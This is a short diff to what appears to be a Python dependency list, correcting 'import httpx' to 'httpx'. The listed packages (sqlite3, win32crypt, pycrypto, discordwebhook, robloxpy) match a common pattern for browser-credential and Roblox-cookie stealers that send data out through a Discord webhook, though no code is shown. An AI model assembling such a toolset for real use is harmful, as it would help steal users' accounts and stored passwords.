@@ -3,6 +3,6 @@ sqlite3
 win32crypt
 pycrypto
 discordwebhook
-import httpx
+httpx
 requests
 robloxpy
